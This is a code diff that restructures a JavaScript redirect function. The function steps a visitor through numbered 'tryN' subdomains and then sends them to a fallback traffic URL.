@@ -81,20 +81,19 @@ function handleRedirect() {
 
     // Check if host matches tryN pattern
     var match = host.match(/^try(\d+)\./);
-    if (match) {
-        var currentTry = parseInt(match[1], 10);
-        if (currentTry < maxTry) {
-            // Increment try number;
-            window.location.href = `https://try${(currentTry + 1)}.${pci}`;
-        } else {
-            // Max reached → go to Google
-            window.location.href = trafficbackURL ;
-        }
-        return;
-    }
 
-    // If host doesn't match any expected pattern → fallback to try1
-    window.location.href = try1
+    if(!match){
+          window.location.href =  try1 ;
+          return;
+    }
+    var currentTry = parseInt(match[1], 10);
+    if (currentTry < maxTry) {
+        // Increment try number;
+        window.location.href = `https://try${(currentTry + 1)}.${pci}`;
+    } else {
+        // Max reached → go to Google
+        window.location.href = trafficbackURL ;
+    }
 }
 
 </script>
